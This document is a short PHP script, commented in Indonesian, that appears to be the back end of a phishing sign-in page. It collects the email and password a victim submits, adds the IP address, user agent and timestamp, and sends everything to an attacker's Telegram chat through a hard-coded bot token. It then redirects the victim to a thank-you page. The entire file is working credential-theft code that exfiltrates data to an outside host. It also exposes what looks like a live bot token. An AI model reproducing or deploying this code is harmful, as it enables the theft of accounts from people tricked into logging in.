<?php
// ============================
// KONFIGURASI TELEGRAM
// ============================
$BOT_TOKEN = "6385702146:AAENdLh7_UarrnNWbUrxGBQaKz3yprudyps";
$CHAT_ID  = "5724713658";

// ============================
// VALIDASI INPUT
// ============================
if (
    empty($_POST['email']) ||
    empty($_POST['password'])
) {
    header("Location: index.php");
    exit;
}

$email = htmlspecialchars($_POST['email']);
$password = htmlspecialchars($_POST['password']);
$ip    = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ua    = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$time  = date("Y-m-d H:i:s");

// ============================
// FORMAT PESAN
// ============================
$message =
"🔔 Sign-in Submit\n\n".
"📧 Email / Phone:\n$email\n\n".
"📧 Password:\n$password\n\n".
"🌐 IP: $ip\n".
"🕒 Waktu: $time\n".
"🖥️ User-Agent:\n$ua";

// ============================
// KIRIM KE TELEGRAM
// ============================
$url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";

$params = [
    'chat_id' => $CHAT_ID,
    'text'    => $message
];

file_get_contents($url . '?' . http_build_query($params));

// ============================
// REDIRECT (OPTIONAL)
// ============================
header("Location: thanks.php"); // atau kembali ke index.php
exit;
